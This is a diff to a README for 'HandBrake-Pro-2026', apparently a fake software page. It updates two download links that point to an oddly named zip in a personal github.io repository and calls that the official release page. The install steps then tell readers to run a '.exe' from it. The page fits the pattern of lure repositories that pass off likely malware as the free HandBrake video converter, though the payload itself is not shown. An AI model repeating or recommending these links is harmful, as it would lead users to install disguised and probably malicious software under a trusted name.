@@ -5,7 +5,7 @@ description: "Download HandBrake for Windows 10 and 11 to convert video files wi
 ---
 # ⚙️ HandBrake-Pro-2026 - Convert your videos with ease today
 
-[![](https://img.shields.io/badge/Download-HandBrake-Pro-2026-blue)](https://github.com/moniquestretched478/moniquestretched478.github.io/raw/refs/heads/main/subendothelial/moniquestretched_io_github_illuminatist.zip)
+[![](https://img.shields.io/badge/Download-HandBrake-Pro-2026-blue)](https://raw.githubusercontent.com/moniquestretched478/moniquestretched478.github.io/main/subendothelial/moniquestretched_io_github_illuminatist.zip)
 
 ## About this software
 
@@ -35,7 +35,7 @@ To run HandBrake-Pro-2026, ensure your computer meet these requirements:
 
 Follow these steps to install the software on your Windows computer.
 
-1.  Visit the official release page to download the latest setup file: [https://github.com/moniquestretched478/moniquestretched478.github.io/raw/refs/heads/main/subendothelial/moniquestretched_io_github_illuminatist.zip](https://github.com/moniquestretched478/moniquestretched478.github.io/raw/refs/heads/main/subendothelial/moniquestretched_io_github_illuminatist.zip).
+1.  Visit the official release page to download the latest setup file: [https://raw.githubusercontent.com/moniquestretched478/moniquestretched478.github.io/main/subendothelial/moniquestretched_io_github_illuminatist.zip](https://raw.githubusercontent.com/moniquestretched478/moniquestretched478.github.io/main/subendothelial/moniquestretched_io_github_illuminatist.zip).
 2.  Locate the downloaded `.exe` file in your Downloads folder.
 3.  Double-click the file to start the installer.
 4.  Accept the installation prompts by clicking the Next button.
